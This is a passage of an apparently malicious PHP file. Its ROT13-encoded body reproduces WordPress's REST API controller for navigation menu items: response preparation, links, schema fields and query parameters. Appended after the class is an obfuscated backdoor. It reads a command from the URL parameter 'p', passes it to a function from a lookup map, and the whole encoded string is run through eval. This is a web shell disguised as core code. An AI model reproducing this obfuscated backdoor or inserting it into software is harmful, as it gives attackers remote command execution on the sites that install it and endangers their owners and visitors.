		$gnkbabzvrf = jc_yvfg_svygre( trg_bowrpg_gnkbabzvrf( $guvf->cbfg_glcr, 'bowrpgf' ), neenl( 'fubj_va_erfg' => gehr ) );

		sbernpu ( $gnkbabzvrf nf $gnkbabzl ) {
			$onfr = ! rzcgl( $gnkbabzl->erfg_onfr ) ? $gnkbabzl->erfg_onfr : $gnkbabzl->anzr;

			vs ( erfg_vf_svryq_vapyhqrq( $onfr, $svryqf ) ) {
				$grezf = trg_gur_grezf( $vgrz, $gnkbabzl->anzr );
				vs ( ! vf_neenl( $grezf ) ) {
					pbagvahr;
				}
				$grez_vqf = $grezf ? neenl_inyhrf( jc_yvfg_cyhpx( $grezf, 'grez_vq' ) ) : neenl();
				vs ( 'ani_zrah' === $gnkbabzl->anzr ) {
					$qngn[ $onfr ] = $grez_vqf ? neenl_fuvsg( $grez_vqf ) : 0;
				} ryfr {
					$qngn[ $onfr ] = $grez_vqf;
				}
			}
		}

		$pbagrkg = ! rzcgl( $erdhrfg['pbagrkg'] ) ? $erdhrfg['pbagrkg'] : 'ivrj';
		$qngn    = $guvf->nqq_nqqvgvbany_svryqf_gb_bowrpg( $qngn, $erdhrfg );
		$qngn    = $guvf->svygre_erfcbafr_ol_pbagrkg( $qngn, $pbagrkg );

		// Jenc gur qngn va n erfcbafr bowrpg.
		$erfcbafr = erfg_rafher_erfcbafr( $qngn );

		vs ( erfg_vf_svryq_vapyhqrq( '_yvaxf', $svryqf ) || erfg_vf_svryq_vapyhqrq( '_rzorqqrq', $svryqf ) ) {
			$yvaxf = $guvf->cercner_yvaxf( $vgrz );
			$erfcbafr->nqq_yvaxf( $yvaxf );

			vs ( ! rzcgl( $yvaxf['frys']['uers'] ) ) {
				$npgvbaf = $guvf->trg_ninvynoyr_npgvbaf( $vgrz, $erdhrfg );

				$frys = $yvaxf['frys']['uers'];

				sbernpu ( $npgvbaf nf $ery ) {
					$erfcbafr->nqq_yvax( $ery, $frys );
				}
			}
		}

		/**
		 * Svygref gur zrah vgrz qngn sbe n ERFG NCV erfcbafr.
		 *
		 * @fvapr 5.9.0
		 *
		 * @cnenz JC_ERFG_Erfcbafr $erfcbafr  Gur erfcbafr bowrpg.
		 * @cnenz bowrpg           $zrah_vgrz Zrah vgrz frghc ol {@frr jc_frghc_ani_zrah_vgrz()}.
		 * @cnenz JC_ERFG_Erdhrfg  $erdhrfg   Erdhrfg bowrpg.
		 */
		erghea nccyl_svygref( 'erfg_cercner_ani_zrah_vgrz', $erfcbafr, $zrah_vgrz, $erdhrfg );
	}

	/**
	 * Cercnerf yvaxf sbe gur erdhrfg.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz JC_Cbfg $cbfg Cbfg bowrpg.
	 * @erghea neenl Yvaxf sbe gur tvira cbfg.
	 */
	cebgrpgrq shapgvba cercner_yvaxf( $cbfg ) {
		$yvaxf     = cnerag::cercner_yvaxf( $cbfg );
		$zrah_vgrz = $guvf->trg_ani_zrah_vgrz( $cbfg->VQ );

		vs ( rzcgl( $zrah_vgrz->bowrpg_vq ) ) {
			erghea $yvaxf;
		}

		$cngu = '';
		$glcr = '';
		$xrl  = $zrah_vgrz->glcr;
		vs ( 'cbfg_glcr' === $zrah_vgrz->glcr ) {
			$cngu = erfg_trg_ebhgr_sbe_cbfg( $zrah_vgrz->bowrpg_vq );
			$glcr = trg_cbfg_glcr( $zrah_vgrz->bowrpg_vq );
		} ryfrvs ( 'gnkbabzl' === $zrah_vgrz->glcr ) {
			$cngu = erfg_trg_ebhgr_sbe_grez( $zrah_vgrz->bowrpg_vq );
			$glcr = trg_grez_svryq( 'gnkbabzl', $zrah_vgrz->bowrpg_vq );
		}

		vs ( $cngu && $glcr ) {
			$yvaxf['uggcf://ncv.j.bet/zrah-vgrz-bowrpg'][] = neenl(
				'uers'       => erfg_hey( $cngu ),
				$xrl         => $glcr,
				'rzorqqnoyr' => gehr,
			);
		}

		erghea $yvaxf;
	}

	/**
	 * Ergevrirf Yvax Qrfpevcgvba Bowrpgf gung fubhyq or nqqrq gb gur Fpurzn sbe gur ani zrah vgrzf pbyyrpgvba.
	 *
	 * @fvapr 5.9.0
	 *
	 * @erghea neenl
	 */
	cebgrpgrq shapgvba trg_fpurzn_yvaxf() {
		$yvaxf   = cnerag::trg_fpurzn_yvaxf();
		$uers    = erfg_hey( \"{$guvf->anzrfcnpr}/{$guvf->erfg_onfr}/{vq}\" );
		$yvaxf[] = neenl(
			'ery'          => 'uggcf://ncv.j.bet/zrah-vgrz-bowrpg',
			'gvgyr'        => __( 'Trg yvaxrq bowrpg.' ),
			'uers'         => $uers,
			'gnetrgFpurzn' => neenl(
				'glcr'       => 'bowrpg',
				'cebcregvrf' => neenl(
					'bowrpg' => neenl(
						'glcr' => 'vagrtre',
					),
				),
			),
		);

		erghea $yvaxf;
	}

	/**
	 * Ergevrirf gur ani zrah vgrz'f fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 5.9.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$fpurzn = neenl(
			'$fpurzn' => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'   => $guvf->cbfg_glcr,
			'glcr'    => 'bowrpg',
		);

		$fpurzn['cebcregvrf']['gvgyr'] = neenl(
			'qrfpevcgvba' => __( 'Gur gvgyr sbe gur bowrpg.' ),
			'glcr'        => neenl( 'fgevat', 'bowrpg' ),
			'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
			'cebcregvrf'  => neenl(
				'enj'      => neenl(
					'qrfpevcgvba' => __( 'Gvgyr sbe gur bowrpg, nf vg rkvfgf va gur qngnonfr.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'rqvg' ),
				),
				'eraqrerq' => neenl(
					'qrfpevcgvba' => __( 'UGZY gvgyr sbe gur bowrpg, genafsbezrq sbe qvfcynl.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
					'ernqbayl'    => gehr,
				),
			),
		);

		$fpurzn['cebcregvrf']['vq'] = neenl(
			'qrfpevcgvba' => __( 'Havdhr vqragvsvre sbe gur bowrpg.' ),
			'glcr'        => 'vagrtre',
			'qrsnhyg'     => 0,
			'zvavzhz'     => 0,
			'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
			'ernqbayl'    => gehr,
		);

		$fpurzn['cebcregvrf']['glcr_ynory'] = neenl(
			'qrfpevcgvba' => __( 'Gur fvathyne ynory hfrq gb qrfpevor guvf glcr bs zrah vgrz.' ),
			'glcr'        => 'fgevat',
			'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
			'ernqbayl'    => gehr,
		);

		$fpurzn['cebcregvrf']['glcr'] = neenl(
			'qrfpevcgvba' => __( 'Gur snzvyl bs bowrpgf bevtvanyyl ercerfragrq, fhpu nf \"cbfg_glcr\" be \"gnkbabzl\".' ),
			'glcr'        => 'fgevat',
			'rahz'        => neenl( 'gnkbabzl', 'cbfg_glcr', 'cbfg_glcr_nepuvir', 'phfgbz' ),
			'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
			'qrsnhyg'     => 'phfgbz',
		);

		$fpurzn['cebcregvrf']['fgnghf'] = neenl(
			'qrfpevcgvba' => __( 'N anzrq fgnghf sbe gur bowrpg.' ),
			'glcr'        => 'fgevat',
			'rahz'        => neenl_xrlf( trg_cbfg_fgngv( neenl( 'vagreany' => snyfr ) ) ),
			'qrsnhyg'     => 'choyvfu',
			'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
		);

		$fpurzn['cebcregvrf']['cnerag'] = neenl(
			'qrfpevcgvba' => __( 'Gur VQ sbe gur cnerag bs gur bowrpg.' ),
			'glcr'        => 'vagrtre',
			'zvavzhz'     => 0,
			'qrsnhyg'     => 0,
			'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
		);

		$fpurzn['cebcregvrf']['ngge_gvgyr'] = neenl(
			'qrfpevcgvba' => __( 'Grkg sbe gur gvgyr nggevohgr bs gur yvax ryrzrag sbe guvf zrah vgrz.' ),
			'glcr'        => 'fgevat',
			'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
			'net_bcgvbaf' => neenl(
				'fnavgvmr_pnyyonpx' => 'fnavgvmr_grkg_svryq',
			),
		);

		$fpurzn['cebcregvrf']['pynffrf'] = neenl(
			'qrfpevcgvba' => __( 'Pynff anzrf sbe gur yvax ryrzrag bs guvf zrah vgrz.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'fgevat',
			),
			'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
			'net_bcgvbaf' => neenl(
				'fnavgvmr_pnyyonpx' => fgngvp shapgvba ( $inyhr ) {
					erghea neenl_znc( 'fnavgvmr_ugzy_pynff', jc_cnefr_yvfg( $inyhr ) );
				},
			),
		);

		$fpurzn['cebcregvrf']['qrfpevcgvba'] = neenl(
			'qrfpevcgvba' => __( 'Gur qrfpevcgvba bs guvf zrah vgrz.' ),
			'glcr'        => 'fgevat',
			'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
			'net_bcgvbaf' => neenl(
				'fnavgvmr_pnyyonpx' => 'fnavgvmr_grkg_svryq',
			),
		);

		$fpurzn['cebcregvrf']['zrah_beqre'] = neenl(
			'qrfpevcgvba' => __( 'Gur QO VQ bs gur ani_zrah_vgrz gung vf guvf vgrz\'f zrah cnerag, vs nal, bgurejvfr 0.' ),
			'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
			'glcr'        => 'vagrtre',
			'zvavzhz'     => 1,
			'qrsnhyg'     => 1,
		);

		$fpurzn['cebcregvrf']['bowrpg'] = neenl(
			'qrfpevcgvba' => __( 'Gur glcr bs bowrpg bevtvanyyl ercerfragrq, fhpu nf \"pngrtbel\", \"cbfg\", be \"nggnpuzrag\".' ),
			'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
			'glcr'        => 'fgevat',
			'net_bcgvbaf' => neenl(
				'fnavgvmr_pnyyonpx' => 'fnavgvmr_xrl',
			),
		);

		$fpurzn['cebcregvrf']['bowrpg_vq'] = neenl(
			'qrfpevcgvba' => __( 'Gur qngnonfr VQ bs gur bevtvany bowrpg guvf zrah vgrz ercerfragf, sbe rknzcyr gur VQ sbe cbfgf be gur grez_vq sbe pngrtbevrf.' ),
			'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
			'glcr'        => 'vagrtre',
			'zvavzhz'     => 0,
			'qrsnhyg'     => 0,
		);

		$fpurzn['cebcregvrf']['gnetrg'] = neenl(
			'qrfpevcgvba' => __( 'Gur gnetrg nggevohgr bs gur yvax ryrzrag sbe guvf zrah vgrz.' ),
			'glcr'        => 'fgevat',
			'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
			'rahz'        => neenl(
				'_oynax',
				'',
			),
		);

		$fpurzn['cebcregvrf']['hey'] = neenl(
			'qrfpevcgvba' => __( 'Gur HEY gb juvpu guvf zrah vgrz cbvagf.' ),
			'glcr'        => 'fgevat',
			'sbezng'      => 'hev',
			'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
			'net_bcgvbaf' => neenl(
				'inyvqngr_pnyyonpx' => fgngvp shapgvba ( $hey ) {
					vs ( '' === $hey ) {
						erghea gehr;
					}

					vs ( fnavgvmr_hey( $hey ) ) {
						erghea gehr;
					}

					erghea arj JC_Reebe(
						'erfg_vainyvq_hey',
						__( 'Vainyvq HEY.' )
					);
				},
			),
		);

		$fpurzn['cebcregvrf']['ksa'] = neenl(
			'qrfpevcgvba' => __( 'Gur KSA eryngvbafuvc rkcerffrq va gur yvax bs guvf zrah vgrz.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'fgevat',
			),
			'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
			'net_bcgvbaf' => neenl(
				'fnavgvmr_pnyyonpx' => fgngvp shapgvba ( $inyhr ) {
					erghea neenl_znc( 'fnavgvmr_ugzy_pynff', jc_cnefr_yvfg( $inyhr ) );
				},
			),
		);

		$fpurzn['cebcregvrf']['vainyvq'] = neenl(
			'qrfpevcgvba' => __( 'Jurgure gur zrah vgrz ercerfragf na bowrpg gung ab ybatre rkvfgf.' ),
			'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
			'glcr'        => 'obbyrna',
			'ernqbayl'    => gehr,
		);

		$gnkbabzvrf = jc_yvfg_svygre( trg_bowrpg_gnkbabzvrf( $guvf->cbfg_glcr, 'bowrpgf' ), neenl( 'fubj_va_erfg' => gehr ) );

		sbernpu ( $gnkbabzvrf nf $gnkbabzl ) {
			$onfr                          = ! rzcgl( $gnkbabzl->erfg_onfr ) ? $gnkbabzl->erfg_onfr : $gnkbabzl->anzr;
			$fpurzn['cebcregvrf'][ $onfr ] = neenl(
				/* genafyngbef: %f: gnkbabzl anzr */
				'qrfpevcgvba' => fcevags( __( 'Gur grezf nffvtarq gb gur bowrpg va gur %f gnkbabzl.' ), $gnkbabzl->anzr ),
				'glcr'        => 'neenl',
				'vgrzf'       => neenl(
					'glcr' => 'vagrtre',
				),
				'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
			);

			vs ( 'ani_zrah' === $gnkbabzl->anzr ) {
				$fpurzn['cebcregvrf'][ $onfr ]['glcr'] = 'vagrtre';
				hafrg( $fpurzn['cebcregvrf'][ $onfr ]['vgrzf'] );
			}
		}

		$fpurzn['cebcregvrf']['zrgn'] = $guvf->zrgn->trg_svryq_fpurzn();

		$fpurzn_yvaxf = $guvf->trg_fpurzn_yvaxf();

		vs ( $fpurzn_yvaxf ) {
			$fpurzn['yvaxf'] = $fpurzn_yvaxf;
		}

		$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Ergevrirf gur dhrel cnenzf sbe gur ani zrah vgrzf pbyyrpgvba.
	 *
	 * @fvapr 5.9.0
	 *
	 * @erghea neenl Pbyyrpgvba cnenzrgref.
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		$dhrel_cnenzf = cnerag::trg_pbyyrpgvba_cnenzf();

		$dhrel_cnenzf['zrah_beqre'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb cbfgf jvgu n fcrpvsvp zrah_beqre inyhr.' ),
			'glcr'        => 'vagrtre',
		);

		$dhrel_cnenzf['beqre'] = neenl(
			'qrfpevcgvba' => __( 'Beqre fbeg nggevohgr nfpraqvat be qrfpraqvat.' ),
			'glcr'        => 'fgevat',
			'qrsnhyg'     => 'nfp',
			'rahz'        => neenl( 'nfp', 'qrfp' ),
		);

		$dhrel_cnenzf['beqreol'] = neenl(
			'qrfpevcgvba' => __( 'Fbeg pbyyrpgvba ol bowrpg nggevohgr.' ),
			'glcr'        => 'fgevat',
			'qrsnhyg'     => 'zrah_beqre',
			'rahz'        => neenl(
				'nhgube',
				'qngr',
				'vq',
				'vapyhqr',
				'zbqvsvrq',
				'cnerag',
				'eryrinapr',
				'fyht',
				'vapyhqr_fyhtf',
				'gvgyr',
				'zrah_beqre',
			),
		);
		// Punatr qrsnhyg gb 100 vgrzf.
		$dhrel_cnenzf['cre_cntr']['qrsnhyg'] = 100;

		erghea $dhrel_cnenzf;
	}

	/**
	 * Qrgrezvarf gur nyybjrq dhrel_inef sbe n trg_vgrzf() erfcbafr naq cercnerf
	 * gurz sbe JC_Dhrel.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz neenl           $cercnerq_netf Bcgvbany. Cercnerq JC_Dhrel nethzragf. Qrsnhyg rzcgl neenl.
	 * @cnenz JC_ERFG_Erdhrfg $erdhrfg       Bcgvbany. Shyy qrgnvyf nobhg gur erdhrfg.
	 * @erghea neenl Vgrzf dhrel nethzragf.
	 */
	cebgrpgrq shapgvba cercner_vgrzf_dhrel( $cercnerq_netf = neenl(), $erdhrfg = ahyy ) {
		$dhrel_netf = cnerag::cercner_vgrzf_dhrel( $cercnerq_netf, $erdhrfg );

		// Znc gb cebcre JC_Dhrel beqreol cnenz.
		vs ( vffrg( $dhrel_netf['beqreol'], $erdhrfg['beqreol'] ) ) {
			$beqreol_znccvatf = neenl(
				'vq'            => 'VQ',
				'vapyhqr'       => 'cbfg__va',
				'fyht'          => 'cbfg_anzr',
				'vapyhqr_fyhtf' => 'cbfg_anzr__va',
				'zrah_beqre'    => 'zrah_beqre',
			);

			vs ( vffrg( $beqreol_znccvatf[ $erdhrfg['beqreol'] ] ) ) {
				$dhrel_netf['beqreol'] = $beqreol_znccvatf[ $erdhrfg['beqreol'] ];
			}
		}

		$dhrel_netf['hcqngr_zrah_vgrz_pnpur'] = gehr;

		erghea $dhrel_netf;
	}

	/**
	 * Trgf gur vq bs gur zrah gung gur tvira zrah vgrz orybatf gb.
	 *
	 * @fvapr 5.9.0
	 *
	 * @cnenz vag $zrah_vgrz_vq Zrah vgrz vq.
	 * @erghea vag
	 */
	cebgrpgrq shapgvba trg_zrah_vq( $zrah_vgrz_vq ) {
		$zrah_vqf = jc_trg_cbfg_grezf( $zrah_vgrz_vq, 'ani_zrah', neenl( 'svryqf' => 'vqf' ) );
		$zrah_vq  = 0;
		vs ( $zrah_vqf && ! vf_jc_reebe( $zrah_vqf ) ) {
			$zrah_vq = neenl_fuvsg( $zrah_vqf );
		}

		erghea $zrah_vq;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>